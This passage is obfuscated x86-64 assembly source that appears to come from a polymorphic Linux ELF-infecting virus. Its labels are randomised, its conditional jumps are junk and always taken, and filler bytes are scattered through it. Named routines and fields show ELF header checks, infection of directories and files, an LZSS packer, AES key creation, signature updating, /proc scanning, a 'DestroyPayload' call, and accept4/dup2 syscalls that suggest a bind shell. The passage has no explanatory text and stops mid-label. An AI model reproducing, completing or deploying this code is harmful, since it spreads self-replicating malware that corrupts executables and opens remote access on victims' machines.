..@Qlqu96jSrCy1:
    mov         rdi, rdi
    jmp         ..@mBd36MvGrRpf
..@Q0gpW3wtxCdn:
    rep         nop
    jl          ..@Hm11JZJw0n5S
    jge         ..@Hm11JZJw0n5S
..@lckJMocs8cIE:
    push        rax
    js          ..@VRXWOo1zRHh0
    jns         ..@VRXWOo1zRHh0
..@W42R1GHRQMwl:
    mov         rdi, rdi
    jmp         ..@C0xgKF3dDucF
..@hLhp3hnfg3FK:
    push        rbx
    jmp         $+3
db 0x13
    jmp         $+5
db 0x09, 0x9f, 0x5d
    jmp         ..@QDgpThQd9VV2
..@60UU7vy1jGkz:
    mov         rbx, rbx
    jmp         $+4
db 0x03, 0x32
    jmp         $+4
db 0xb6, 0xba
    jl          ..@QyE5fFpk1aiX
    jge         ..@QyE5fFpk1aiX
..@saBJ1eU2ubEx:
    mov         rdi, rdi
    jmp         ..@JpwO3y3EPIZB
..@KwcK4Ym1qscY:
    cmp         DWORD [r1], 0x464c457f
    jb          ..@xbTPoUvaPlM2
    jae         ..@xbTPoUvaPlM2
..@2FeYJOK7FKq4:
    pop         rdx
    jmp         ..@YdYl4ZWp1edx
..@N5ep8cFZotWZ:
    pop         rdx
    jmp         ..@IFdV3gmC0MBg
..@SBaaPd14m3O3:
    mov         r3d, 0x02
    jmp         $+5
db 0x52, 0x0a, 0xde
    je          ..@mpeGTnupIFRA
    jne         ..@mpeGTnupIFRA
..@Th8AKDKQowfH:
    xor         r3, r3
    jmp         $+4
db 0xbb, 0x7c
    jl          ..@gOeqYr9pS0Sw
    jge         ..@gOeqYr9pS0Sw
..@u3xHJUTKlxat:
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    jmp         $+4
db 0x13, 0x6c
    js          ..@zxqbT8BesngC
    jns         ..@zxqbT8BesngC
..@9Vwzz62tWOCa:
    mov         rax, rax
    jl          ..@fa1NRL5kBu6h
    jge         ..@fa1NRL5kBu6h
..@CiNsd8mCL9do:
    jnz         ..@jUfk4Hz7pOPv
    js          ..@5lC2sAmyV25z
    jns         ..@5lC2sAmyV25z
..@UIEqdjmIdTT2:
    pop         rcx
    jmp         ..@FFm6yZSYi9pI
..@5F5EbqNInIs2:
    push        rax
    jmp         $+4
db 0xd0, 0xbb
    jmp         ..@KeNBljH6vTGR
..@uvnEB2dw33Wx:
    cmp         BYTE [r1+16], ET_EXEC
    jmp         $+3
db 0x4c
    jl          ..@3djeCv2G00eo
    jge         ..@3djeCv2G00eo
..@kHepSgX30lI0:
    sub         r4, m6
    js          ..@JCbPgmJAVKqH
    jns         ..@JCbPgmJAVKqH
..@hTDJKrbavS4t:
    xor         r1, r1
    jmp         $+4
db 0x69, 0xe8
    jmp         $+3
db 0xb0
    jmp         ..@zruwkSDBzWV8
..@oeGjkav4kDJA:
    ret
    jmp         $+3
db 0xa5
    jmp         $+5
db 0xcc, 0xd2, 0x1e
    js          ..@S8XxivekvC8L
    jns         ..@S8XxivekvC8L
..@NUPKxncQ8M0S:
    mov         r1w, WORD [rsp+_UPDATASIG_OFF.keyprev+2]
    jl          ..@bcajXCSEbyKL
    jge         ..@bcajXCSEbyKL
..@puNfLQpYsa6b:
    add         r2, _virus-_start
    js          ..@EGrDaXdTUQDe
    jns         ..@EGrDaXdTUQDe
..@sVXF3SvOVIpx:
    push        rcx
    jmp         $+3
db 0x90
    jmp         $+3
db 0xc8
    jmp         $+3
db 0xbe
    jmp         ..@tjHaiU2jkTu3
..@QmNHItAHDexP:
    mov         rbp, rbp
    jmp         $+4
db 0xfb, 0x36
    js          ..@HiAHGyFo3ga2
    jns         ..@HiAHGyFo3ga2
..@ZwYQEyD5WahR:
    sub         WORD [rsp+_LZSSE_OFF.buffersize], WINDOW_LENGTH
    jmp         $+5
db 0xc5, 0x9f, 0x7c
    jmp         $+5
db 0x2d, 0x09, 0x09
    jmp         $+3
db 0x44
    jmp         ..@diSnKtIg3G2r
..@jIOnb59A9TZI:
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    je          ..@UEE5Xu1u2hZy
    jne         ..@UEE5Xu1u2hZy
..@8TXTFject9ko:
    mov         rbp, rbp
    jmp         $+5
db 0x56, 0x24, 0x4b
    js          ..@MTPKHxDtSiM9
    jns         ..@MTPKHxDtSiM9
..@IHhP5SZkVYpn:
    shr         edx, 1
    jmp         ..@6IRY8RrjPAlW
..@bwYbIhIXnm7x:
    mov         r2, QWORD [r1+e_h.e_phoff]
    jmp         ..@drTbFmfDLJym
..@ROkBsdF9L701:
    mov         r4, QWORD [rsp+_INFDIR_OFF.dirindex]
    je          ..@Mlmhi8jAXTLP
    jne         ..@Mlmhi8jAXTLP
..@8r9qZ6Svt9l1:
    push        rsi
    jmp         $+3
db 0xc2
    js          ..@kMcTJrZCXTjf
    jns         ..@kMcTJrZCXTjf
..@RSlC3cmXhmyi:
    mov         r2, 0x2
    jmp         ..@2G7Ta2Ck2AQK
..@9XeejvdJfcgN:
    xor         rax, rax
    js          ..@RYbNGaBP7p1o
    jns         ..@RYbNGaBP7p1o
..@wlDbLk7BtiHL:
    xchg        rbx, rbx
    jb          KeyGen
    jae         KeyGen
..@dbmEO2yQ90W2:
    push        rax
    jmp         ..@nwIXcoolPMUl
..@LmOyWjna0Wdb:
    push        rbx
    jmp         $+5
db 0xd4, 0xc2, 0xb0
    je          ..@wAzxDcM4oCqk
    jne         ..@wAzxDcM4oCqk
..@GLxW0rOrV1dt:
    push        rdi
    js          ..@v5qd0ZUWpIsm
    jns         ..@v5qd0ZUWpIsm
..@uSm7msPdCG29:
    mov         r2, rax
    jmp         $+5
db 0x17, 0x3d, 0x54
    jmp         ..@7WJR4jjh3q4v
..@fJ6NuRNXhI4E:
    add         rax, r2
    je          ..@uSm7msPdCG29
    jne         ..@uSm7msPdCG29
..@RAxuWG3zJibL:
    push        rbx
    jb          ..@tRXvZFYKrvCe
    jae         ..@tRXvZFYKrvCe
..@TXJKBJtHgs2I:
    mov         rdx, rdx
    jmp         $+4
db 0xe3, 0x16
    jmp         $+3
db 0x68
    js          ..@hTDJKrbavS4t
    jns         ..@hTDJKrbavS4t
..@YxDQNlGaOZyR:
    mov         rax, rax
    jmp         $+5
db 0x6c, 0x16, 0xa3
    jmp         ..@xSBHsdaicW8v
..@R8nSqv1ZK9gw:
    pop         r1
    jb          ..@RiY2rczJlmlb
    jae         ..@RiY2rczJlmlb
..@6fMoYhDlbxqM:
    sub         r2, 1
    jmp         $+5
db 0xff, 0x52, 0x95
    js          ..@zvMZAQzMoeRk
    jns         ..@zvMZAQzMoeRk
..@LhmVW6wJSWpP:
    push        rcx
    jmp         $+5
db 0xa2, 0x33, 0x6b
    js          ..@YHtOO1W1ktF6
    jns         ..@YHtOO1W1ktF6
..@JdQnjgnwKjWj:
    rep         movsb
    jb          ..@katpGgmJOcay
    jae         ..@katpGgmJOcay
..@2BhGB2j8S35t:
    xor         r4, r4
    jl          ..@Aeg8LF9UeBug
    jge         ..@Aeg8LF9UeBug
..@kzR68a7x3NBv:
    mov         r1, QWORD [r5+file.filename]
    jb          ..@ITaS7IpEGp6H
    jae         ..@ITaS7IpEGp6H
..@HissivJZQpmT:
    mov         rdx, rdx
    js          ..@FfrkxehqLzO3
    jns         ..@FfrkxehqLzO3
..@DJr2WDv1w4RB:
    je          ..@uEbpNtmKcjpw
    jmp         ..@y41R159tczyK
..@Wi3ioR4vWxB9:
    mov         r4, m7
    js          ..@kHepSgX30lI0
    jns         ..@kHepSgX30lI0
..@EbEmYzQrvHTj:
    xchg        rbx, rbx
    jl          ..@Wd4h5kIgllSE
    jge         ..@Wd4h5kIgllSE
..@AQ4Q2XWhcvK3:
    push        r5
    jmp         $+3
db 0xe2
    jb          ..@2BhGB2j8S35t
    jae         ..@2BhGB2j8S35t
..@6RknKFNxs7jI:
    cmp         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH*2-LOOKAHEAD_LENGTH
    jmp         $+4
db 0xe7, 0xda
    jb          ..@qaejK6UkKodQ
    jae         ..@qaejK6UkKodQ
..@ZoN1IWPQtpbu:
    pop         rdi
    jmp         $+3
db 0x6b
    jb          ..@tzrCrGZ7KL9C
    jae         ..@tzrCrGZ7KL9C
..@2K7DaJ9zfLmm:
    push        r5
    jl          ..@FBPXcAXM1JwW
    jge         ..@FBPXcAXM1JwW
..@YRzi8wTLfYj5:
    xchg        rbx, rbx
    jmp         $+5
db 0x5b, 0xe9, 0x11
    js          ..@NDMIYlojm2ff
    jns         ..@NDMIYlojm2ff
..@cz08oEuQ1rlC:
    xchg        rbx, rbx
    jmp         $+3
db 0x01
    jl          ..@yRLMhJayGRgd
    jge         ..@yRLMhJayGRgd
..@8Mofp72ueYHH:
    xchg        rcx, rcx
    jmp         $+4
db 0xae, 0x74
    jmp         $+5
db 0xce, 0x37, 0xbf
    jb          ..@3ivnixd0rlIU
    jae         ..@3ivnixd0rlIU
..@EozJVTrqDDpj:
    push        rsi
    jmp         $+3
db 0x99
    jmp         $+3
db 0xab
    jb          ..@xaJv4uU02TwG
    jae         ..@xaJv4uU02TwG
..@JDkyyeYty3XL:
    push        r5
    jmp         $+3
db 0x47
    jl          ..@9e7OWom9Vqvt
    jge         ..@9e7OWom9Vqvt
..@i3IfFwSUiSVz:
    mov         r2, r4
    jmp         $+3
db 0xb0
    jb          ..@1ou0czQi7h0y
    jae         ..@1ou0czQi7h0y
..@8VmYV3sQyhXM:
    pop         r4
    js          ..@AhlC9k8Msjbn
    jns         ..@AhlC9k8Msjbn
..@lmrYQSQU6kNu:
    pop         r3
    jb          ..@xCMzjLk5c2Hp
    jae         ..@xCMzjLk5c2Hp
..@hjEhdqvI9UaV:
    jmp         ..@5Ii8U7ttfpiJ
    jmp         $+5
db 0x49, 0xbd, 0xe5
    jmp         $+3
db 0x8b
    jb          ..@4P2K30ofBJUH
    jae         ..@4P2K30ofBJUH
..@X8H9MHKSlJEZ:
    ret
    jmp         LzssEncoder
..@gOeqYr9pS0Sw:
    mov         rcx, rcx
    jmp         ..@KteTZUj0Bp8W
..@V99fsisaewSG:
    push        rsi
    jmp         $+4
db 0xa6, 0x0e
    jmp         ..@kMlcWhuBFvt9
..@A8k7c1grmqk3:
    push        rsi
    js          ..@QMxLddgSK3BY
    jns         ..@QMxLddgSK3BY
..@TZhRiXKnNGd9:
    mov         rsp, rsp
    jmp         ..@5UUCrNJS24HD
..@ESZksUhtyD9O:
    mov         QWORD [r5+file.filesize], rax
    jmp         $+5
db 0x09, 0xa0, 0xb9
    jmp         $+3
db 0x00
    jmp         $+5
db 0x28, 0x2d, 0x79
    js          ..@EsqWkfN1Tox3
    jns         ..@EsqWkfN1Tox3
..@AHs6ElhyL2Im:
    mov         r1, 0xf
    js          ..@7yCi15nTRLtY
    jns         ..@7yCi15nTRLtY
..@8Vwm4ffBhITo:
    pop         rax
    jmp         $+5
db 0x0a, 0xf0, 0xe4
    je          ..@OaVpWDuvUQyK
    jne         ..@OaVpWDuvUQyK
..@KeNBljH6vTGR:
    pop         rax
    jmp         $+5
db 0x58, 0x1b, 0xb3
    jmp         $+5
db 0x2b, 0xa7, 0x4a
    jmp         $+3
db 0x44
    jmp         $+3
db 0x2d
    jb          ..@pXVVgeDjtIvV
    jae         ..@pXVVgeDjtIvV
..@wIAJGTgtErpO:
    xchg        rcx, rcx
    je          ..@96mSKUX0PfZE
    jne         ..@96mSKUX0PfZE
..@mRaqOwUutBlP:
    jge         ..@BYNm47wM8Ch8
    jl          ..@sSPxQXbaUYrY
    jge         ..@sSPxQXbaUYrY
..@m2wmc7QwVosD:
    xor         rax, rax
    jmp         $+5
db 0x41, 0xcd, 0xeb
    jb          ..@sCWIo8kRHpFL
    jae         ..@sCWIo8kRHpFL
..@xEDddp3vZQSu:
    push        rax
    jmp         $+3
db 0xb1
    jl          ..@LNrYdzIrDAJz
    jge         ..@LNrYdzIrDAJz
..@JlnTteW9Y4ln:
    cmp         BYTE [r1], '/'
    jmp         ..@qr0jqEoWDR3n
..@uVUdFPmh4dP3:
    lea         r2, [rsp+_PROC_OFF.buffer+0x6]
    jmp         ..@LihWzGTbjo5U
..@NS3waNe4acUI:
    mov         rbp, rbp
    js          ..@vkRfskXffFwp
    jns         ..@vkRfskXffFwp
..@uaPkLSHjiU0E:
    mov         rbx, rbx
    jl          ..@dkq3FH0NbpmA
    jge         ..@dkq3FH0NbpmA
..@X7s94pRyXfsx:
    mov         rdx, rdx
    jmp         $+5
db 0x06, 0x98, 0xd4
    js          ..@O9aNFDtZjNoJ
    jns         ..@O9aNFDtZjNoJ
..@xWucXduicjVM:
    call        DestroyPayload
    jb          ..@YWaFNXEL47vZ
    jae         ..@YWaFNXEL47vZ
..@iljOnqcs11X3:
    mov         rbp, rbp
    jmp         ..@QJ4zg0iMkPjX
..@eKpuoCTjQoOn:
    pop         r4
    jmp         ..@MAf2apW9aSOX
..@r8ATS4IbQ4mx:
    ret
    jmp         $+3
db 0xa9
    jmp         ..@ZcJZqhnAUXGj
..@VXzYLYTswDhR:
    cmp         eax, 0x03
    jb          ..@2FQe15UiIxfS
    jae         ..@2FQe15UiIxfS
..@vVfRn3bt4IFQ:
    sub         rsp, _INFFILE_OFF_size
    jb          ..@aG7y4yMRRI6E
    jae         ..@aG7y4yMRRI6E
..@95cuwtdW2akl:
    push        rdx
    jmp         $+4
db 0x4f, 0x24
    jmp         ..@C4UGWOUD1xZC
..@1YN4xV1HKgJU:
    mov         rcx, rcx
    jmp         $+4
db 0x4d, 0x9c
    jmp         $+4
db 0xda, 0x93
    jb          ..@gTC6wzrW312b
    jae         ..@gTC6wzrW312b
..@YnFe9Os95P8z:
    OFILE       [r5], 0x00
    jl          ..@Mqf2A2AiPTmn
    jge         ..@Mqf2A2AiPTmn
..@lG6SF5rYYDw1:
    mov         rsi, rsi
    jmp         $+4
db 0x6e, 0x06
    jmp         $+4
db 0x0c, 0xf4
    jmp         $+3
db 0xfd
    jmp         $+4
db 0x88, 0xbe
    jl          ..@QI9UXCR9WprD
    jge         ..@QI9UXCR9WprD
..@hgDoGSPPBir0:
    mov         r4, QWORD [rsp+_INFDIR_OFF.dirindex]
    jmp         $+3
db 0xc2
    jmp         ..@q9TS7N4p3FdH
..@ijRsVUu6QmEP:
    push        r2
    jmp         $+5
db 0xd4, 0xe6, 0x41
    jb          ..@3E9qGapb1Qqy
    jae         ..@3E9qGapb1Qqy
..@q1LH9ZbOqT3C:
    rep         stosb
    jmp         ..@DTlXlgAGzMfR
..@4pUUjmChbMkP:
    mov         eax, SYS_DUP2
    jmp         $+5
db 0xb7, 0xfa, 0xdd
    jmp         $+3
db 0xf2
    jmp         ..@dMJJ42WcCxee
..@JTwdl9bkuslM:
    cmp         rax, 0x01
    jmp         $+5
db 0x7d, 0x4c, 0xbb
    js          ..@FdRWcAv1LpnF
    jns         ..@FdRWcAv1LpnF
..@FRQwkU8cuthg:
    pop         rdi
    js          ..@j6IvKK3SoKrq
    jns         ..@j6IvKK3SoKrq
..@EaygGAoC79QP:
    xor         rax, rax
    jmp         $+3
db 0x2f
    jb          ..@67wtIC4ihIxp
    jae         ..@67wtIC4ihIxp
..@gRG5Ce3d3YyE:
    xor         rax, rax
    jmp         $+5
db 0x02, 0x9a, 0xf4
    js          ..@HnstgDVHykBO
    jns         ..@HnstgDVHykBO
..@4LX7oSSj6fjB:
    xchg        rdx, rdx
    jmp         $+3
db 0x53
    js          ..@QfbRnMErX3iq
    jns         ..@QfbRnMErX3iq
..@iLYTdq3Lgy6i:
    push        rcx
    jmp         $+5
db 0x04, 0x65, 0xe7
    jb          ..@NJKAVGidAivb
    jae         ..@NJKAVGidAivb
..@5UUCrNJS24HD:
    rep         movsb
    jmp         $+4
db 0xc6, 0xb3
    je          ..@TwWs9gBaEs1w
    jne         ..@TwWs9gBaEs1w
..@MDjNYUeNspO8:
    and         r2, 1b
    jb          ..@mpVoyKAchUfg
    jae         ..@mpVoyKAchUfg
..@I7iXZyMTs9f3:
    pop         rsi
    jmp         ..@CIxFJTAK5uzH
..@YPzyNoFb0Jri:
    xchg        rdx, rdx
    jmp         ..@tH8DKPHpXvAq
..@etOkvm15XSfi:
    pop         rcx
    js          ..@TzSVZYS15Z2e
    jns         ..@TzSVZYS15Z2e
..@G8g8Mx69pTpB:
    call_vsp    Aes256KeyCreation
    jmp         $+4
db 0x1b, 0x9f
    jb          ..@scjiBnJP1Bbc
    jae         ..@scjiBnJP1Bbc
..@JlKqWxVmJhne:
    push        rsi
    jmp         $+5
db 0xbd, 0x21, 0x35
    je          ..@kYm7x9sSGUi5
    jne         ..@kYm7x9sSGUi5
..@e85o6hTJYcuD:
    jge         ..@rB8JI6bT3x9a
    jmp         $+3
db 0x4a
    jmp         ..@m2wmc7QwVosD
..@8OIk6V6v5gr2:
%ifdef X86_64
    push        rax
%endif
    jmp         $+4
db 0x94, 0x17
    js          ..@YvgbIvumeZxN
    jns         ..@YvgbIvumeZxN
..@cyGNxsTCd25W:
    pop         rax
    jb          ..@Uc8LWyW484QH
    jae         ..@Uc8LWyW484QH
..@VraYx6EUr92o:
    cmp         r4, 0x00
    js          ..@of58j5USMrkF
    jns         ..@of58j5USMrkF
..@RJIRNMxcpgRH:
    mov         rcx, rcx
    jmp         $+3
db 0xe9
    jb          ..@hbcsWVD5A6hx
    jae         ..@hbcsWVD5A6hx
..@qIMGPadWqj2v:
    add         r1, 1
    je          ..@75fB9iZomYp4
    jne         ..@75fB9iZomYp4
..@G0vW1L1YB8uW:
    pop         rsi
    jmp         $+3
db 0x0c
    jmp         $+5
db 0x5d, 0x1a, 0xa9
    jmp         $+5
db 0xfc, 0xb2, 0xa8
    jl          ..@nmJVhBQRUtYq
    jge         ..@nmJVhBQRUtYq
..@ed6cwcNQZR5X:
    mov         rsi, rsi
    js          ..@7JCXGNNpobyX
    jns         ..@7JCXGNNpobyX
..@sfmpT0GCPymo:
    call_vsp    ExitProgram
    js          ..@6tXRev0uFGct
    jns         ..@6tXRev0uFGct
..@deFhbVhfPNoC:
    pop         rdx
    jmp         $+3
db 0xf3
    jl          ..@lckJMocs8cIE
    jge         ..@lckJMocs8cIE
..@HPQOkbpwBncP:
    push        rcx
    jmp         $+4
db 0xd4, 0x43
    je          ..@xPc2Y2Rc9LVR
    jne         ..@xPc2Y2Rc9LVR
..@JL7R0U9SI2eC:
    xchg        rbx, rbx
    jmp         $+4
db 0x9e, 0x0d
    jmp         $+4
db 0x2b, 0x37
    jb          ..@Al5N1CbfBxZl
    jae         ..@Al5N1CbfBxZl
..@x9DmboUmU6HC:
    rep         nop
    jmp         ..@PvmRGoQ0WBlP
..@jy6OMAFxrpZM:
    xor         r3, r3
    jmp         ..@9Lb9nwsvL1xE
..@5WKb2WdXV3ur:
    rep         nop
    jl          ..@qfYltYky6Uf5
    jge         ..@qfYltYky6Uf5
..@MkPHfQxLozQa:
    mov         eax, SYS_ACCEPT4
    jmp         $+3
db 0x26
    jmp         $+4
db 0xa7, 0x1e
    jmp         $+3
db 0x5b
    jl          ..@oB7kSzdY8DMs
    jge         ..@oB7kSzdY8DMs
..@lnF5Tfg7oNsn:
    pop         rcx
    js          ..@e0FkeGu9Gg8S
    jns         ..@e0FkeGu9Gg8S
..@yCvLrlyOmt7R:
    jmp         ..@yxOkqU9aiUtE
    jmp         $+4
db 0xc6, 0xd5
    jmp         $+4
db 0x9e, 0x92
    js          ..@kELIWW7luj3y
    jns         ..@kELIWW7luj3y
..@ckzPiSSHao1F:
    mov         QWORD [rsp+_PROC_OFF.dirindex], 0x00
    jmp         $+4
db 0x11, 0xea
    jl          ..@kStxBkyOxi1q
    jge         ..@kStxBkyOxi1q
..@JL2jTvQfTlPV:
    xor         rax, rax
    jb          ..@sLpyYW5rcT6U
    jae         ..@sLpyYW5rcT6U
..@v3nZDt5AXStJ:
    mov         rdx, rdx
    jmp         ..@UNCnvhc0nTug
..@J4hmxidokhcy:
%ifdef X86_64
    mov         rax, rax
%endif
    jmp         $+4
db 0xb8, 0xfd
    jmp         ..@SwYAXYKsDGyv
..@MdPcVhZspVJZ:
    xchg        rax, rax
    jmp         ..@9Ry4aEkCgjOu
..@hOWsgyqPpWHN:
    mov         QWORD [rsp+_AESE_OFF.keyaddr], r3
    jmp         $+4
db 0xaf, 0xce
    jmp         $+3
db 0x92
    jmp         ..@vFHzrcooATIl
..@cMUi8uDGOQnx:
    xor         rax, rax
    jmp         $+3
db 0x77
    js          ..@eLelSZ53vXl3
    jns         ..@eLelSZ53vXl3
..@weJSPyX9ZxqC:
    jl          ..@jbxiexDquA4f
    jmp         $+3
db 0x1a
    js          ..@oMOMQfQtRbaI
    jns         ..@oMOMQfQtRbaI
..@DTDpDyu58TzW:
    mov         r2, vsp
    jl          ..@ycd1UO3ZmK0y
    jge         ..@ycd1UO3ZmK0y
..@NEe7w2QpT8oc:
    VAR         packed, pwd_var
    jmp         $+4
db 0x1e, 0xe9
    jmp         $+3
db 0x7d
    jb          ..@1IJweaYAQGec
    jae         ..@1IJweaYAQGec
..@ZWrfRNGVZSXN:
    pop         rdx
    jmp         ..@rcPf6ROZfbRn
..@C0xgKF3dDucF:
    mov         r1, r5
    jmp         $+5
db 0x5f, 0x6f, 0xd2
    jmp         ..@RSlC3cmXhmyi
..@thxBdgq5y61o:
    mov         BYTE [rsp+_LZSSE_OFF.match_len], 0x1
    jmp         $+5
db 0x7a, 0xba, 0xf5
    jmp         ..@DVRJs27eOKK4
..@qTsThhcIxz0U:
    pop         rcx
    jb          ..@jrFxwUXxzD7k
    jae         ..@jrFxwUXxzD7k
..@OmhqkY5Glimt:
    pop         rbx
    jmp         $+4
db 0x52, 0xf4
    jb          ..@6DV5otL9KrV1
    jae         ..@6DV5otL9KrV1
..@RzDZtRDuJYoH:
    mov         r3, [r1+e_h.e_phoff]
    jmp         $+3
db 0x91
    jmp         ..@tFP0gKYOwtHx
..@3qQcTuuMdM1V:
    rep         nop
    js          ..@6WAjl4ZqNPzG
    jns         ..@6WAjl4ZqNPzG
IsNum:
    jmp         ..@vzyiqHqf883t
..@lraZaB3Q8hAW:
    push        rsi
    jmp         $+3
db 0xff
    jmp         ..@Z5tbhDb8xMnU
..@jXKe1AfFPoov:
    xor         r3, r3
    jmp         $+4
db 0xae, 0x54
    jmp         $+5
db 0xf8, 0x75, 0x64
    jmp         ..@v4ahKHeqdml5
..@7uTqFCEZAKgp:
    pop         rsi
    jmp         $+3
db 0x99
    js          ..@Mc1LN8Vo7TAw
    jns         ..@Mc1LN8Vo7TAw
..@OQxshLmTuAeK:
    movdqu      xmm1, oWORD [rsp+0x60]
    jmp         $+4
db 0xbf, 0x44
    jb          ..@s1XN53uW093l
    jae         ..@s1XN53uW093l
..@ia9UySb1GT5Q:
%ifdef X86_64
    pop         rcx
%endif
    jmp         $+3
db 0x12
    jb          ..@QoDI77Wo2pH5
    jae         ..@QoDI77Wo2pH5
..@5QQ28ZOQsluK:
    je          ..@9Q8ZQKsxxIJb
    jmp         $+3
db 0x4e
    jl          ..@GnPBucHgq0Ta
    jge         ..@GnPBucHgq0Ta
..@VJsA3w5NBOlB:
    add         r1, rax
    jmp         ..@hzvcH2lLt9L5
..@AzvuTCUK97i4:
    mov         rbp, rbp
    jmp         ..@uCHjsew5tQpJ
..@r8kiYEckxExX:
    pop         rsi
    jmp         ..@8lKD1C2ceF1I
..@m1ABnb2wqu04:
    mov         r2, r5
    jmp         $+3
db 0x18
    jmp         $+5
db 0xc7, 0x94, 0x12
    jl          ..@fi3ykJlqGxYF
    jge         ..@fi3ykJlqGxYF
..@aH5sdodMgQ4r:
    lea         r1, [rsp+_PAYLOAD_OFF.key]
    jmp         $+4
db 0x84, 0x9b
    jl          ..@ciZcXMoF0SMl
    jge         ..@ciZcXMoF0SMl
..@Aeg8LF9UeBug:
    mov         rsi, rsi
    js          ..@gQNGKfKMo1az
    jns         ..@gQNGKfKMo1az
..@y94hVXBqxJDw:
    jne         ..@OwykEirAaJoE
    jl          ..@T6oTH03AibTz
    jge         ..@T6oTH03AibTz
..@ZyfMGV51jLWg:
    rep         nop
    jl          ..@WfBs6Oz5X82V
    jge         ..@WfBs6Oz5X82V
..@hH8Wnws5VMrt:
    pop         rcx
    jmp         $+3
db 0x59
    jmp         ..@mWe4wrn1tI0R
..@4bMPdROAUjIZ:
    pop         rdx
    jb          ..@djL8PY3JK4Bc
    jae         ..@djL8PY3JK4Bc
..@B3I3rwNXiyU9:
    test        eax, eax
    jmp         $+5
db 0xa7, 0xbd, 0x32
    jb          ..@APci3ddKfU3E
    jae         ..@APci3ddKfU3E
..@FLNHLuISOZsQ:
    add         rsi, rcx
    jmp         ..@F9Uspe7DxBCc
..@cGNSurEi8cEI:
    push        rdx
    jmp         $+5
db 0xad, 0xbd, 0x43
    jmp         $+5
db 0x9f, 0x34, 0xa9
    jl          ..@FQtRjWfEiy9e
    jge         ..@FQtRjWfEiy9e
..@vMozNFIPod8Y:
    push        rbx
    jl          ..@7fyHzQDyhno0
    jge         ..@7fyHzQDyhno0
..@kce5JPzRE6nI:
    mov         rsi, QWORD [rsp+_PAYLOAD_OFF.entry]
    jmp         ..@RN9T4gPzixfI
..@Mqf2A2AiPTmn:
    cmp         eax, 0x3
    js          ..@a6CVYMS47fgG
    jns         ..@a6CVYMS47fgG
..@jpvn2RDbnEwa:
    pop         rdi
    jmp         ..@8w0KTaUVWS2z
..@wLQyLANATe5O:
    push        rdx
    jb          ..@lwl4Rm3L5TKQ
    jae         ..@lwl4Rm3L5TKQ
..@HwCRuOnlP0LM:
    xchg        rdx, rdx
    jl          ..@emByAKHOJGk6
    jge         ..@emByAKHOJGk6
..@Dtm7n342aH4P:
    xchg        rdx, rdx
    jmp         $+3
db 0xe4
    js          ..@BPf7wUtuSa9y
    jns         ..@BPf7wUtuSa9y
..@43CnVAWh5KQh:
    xchg        rbx, rbx
    jmp         $+5
db 0xff, 0x0c, 0xb9
    jmp         $+3
db 0x13
    jmp         $+4
db 0xd1, 0xfc
    jmp         ..@qcOT3dWBjptj
..@XAgbYY9aIqty:
%ifdef X86_64
    mov         rsi, rsi
%endif
    jmp         $+4
db 0x8d, 0x61
    je          ..@RJtMkGrrZRow
    jne         ..@RJtMkGrrZRow
..@TjJehnsHF0gv:
    pop         rsi
    jmp         $+3
db 0xb7
    jb          ..@zaejkRYJU0y5
    jae         ..@zaejkRYJU0y5
..@IjJM1OF0Tmw6:
    xchg        rsi, rsi
    jmp         ..@MEwxwz2nRrGV
..@0VCEL6dE1qed:
%ifdef X86_32
    mov         rbx, rbx
%endif
    jb          ..@Vy3iZSmiOLww
    jae         ..@Vy3iZSmiOLww
..@ZxqZYoggKRDn:
    pop         rdx
    js          ..@S5DQmikuQV6Z
    jns         ..@S5DQmikuQV6Z
..@jFfmghrhEjjN:
    GGLOBAL     _signature
    jl          ..@Gg42ruPvMOD6
    jge         ..@Gg42ruPvMOD6
..@yOYW1BFNcLW1:
%ifdef X86_32
    push        ebp
%endif
    jmp         ..@jgCIGFJRL4AS
..@dl4gpgDPIm6V:
    xor         rax, rax
    jmp         $+3
db 0x5c
    jb          ..@29UcL16wkAca
    jae         ..@29UcL16wkAca
..@R10Lp8gHmASX:
    push        rsi
    jl          ..@7uTqFCEZAKgp
    jge         ..@7uTqFCEZAKgp
..@9KpPYrRW8YKs:
    call        IsNum
    jmp         ..@uaPkLSHjiU0E
..@5aRH8gdQroMJ:
    mov         rbp, rbp
    js          ..@dcVROi2xQpmG
    jns         ..@dcVROi2xQpmG
..@rhUlCMtnMGlp:
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    js          ..@KdwXAI15lCMx
    jns         ..@KdwXAI15lCMx
..@HWz2TjKd2ueE:
    xchg        rsi, rsi
    jmp         $+4
db 0xac, 0xf3
    jmp         $+3
db 0xcb
    je          ..@fJaJMcpZGeyV
    jne         ..@fJaJMcpZGeyV
..@lZtHnhgsGpi3:
    push        rdx
    jmp         $+5
db 0x67, 0xf4, 0x34
    jmp         $+4
db 0x9c, 0x7e
    jmp         $+5
db 0x87, 0xed, 0xb3
    je          ..@qlv4Dq7B9mKC
    jne         ..@qlv4Dq7B9mKC
..@jspkDEek0pmB:
    mov         r3, original_virus_len-non_packed_len
    jmp         $+3
db 0x4d
    jmp         ..@jee7lj4RvWjr
..@JzqiPuKFit0T:
    add         QWORD [rsp+_PROC_OFF.dirindex], rax
    jmp         $+3
db 0x1c
    jmp         ..@cz08oEuQ1rlC
..@73crtGPQ0Bqu:
    mov         rcx, rcx
    js          ..@5swrmqtM7Ot8
    jns         ..@5swrmqtM7Ot8
..@vQWt96PaKuUr:
    mov         rdi, QWORD [r5+file.fileptr]
    jmp         $+3
db 0x0a
    jb          ..@EmD99nsqjf6A
    jae         ..@EmD99nsqjf6A
..@eaZbn2X9C5QN:
    push        rsi
    jmp         $+4
db 0xe5, 0x94
    jmp         ..@75tHen8X7B2j
..@FZD3rwLIvZpo:
    add         r4, r3
    jmp         $+5
db 0xb0, 0x33, 0x3a
    jmp         $+3
db 0x2f
    jmp         $+5
db 0x2d, 0x33, 0x4e
    jmp         ..@y0jFWVWPkvNO
..@4qO2pJ3MTwBC:
%ifdef X86_64
    xor         rdx, rdx
%endif
    jmp         ..@kkKyzhDbmT0g
..@yxOkqU9aiUtE:
    xchg        rdi, rdi
    jl          ..@usi54h52eUkU
    jge         ..@usi54h52eUkU
..@oMFgiWwyH28C:
    jge         ..@Kj9iDOvqyJrc
    js          ..@thxBdgq5y61o
    jns         ..@thxBdgq5y61o
..@SGFs8leCTxGJ:
    push        rdx
    jmp         ..@ZWrfRNGVZSXN
..@zxHM2fwQMleS:
    sub         r4, QWORD [r1+e_h.e_entry]
    jl          ..@aR4yfTFE0En5
    jge         ..@aR4yfTFE0En5
..@7T9cnKhVR5yS:
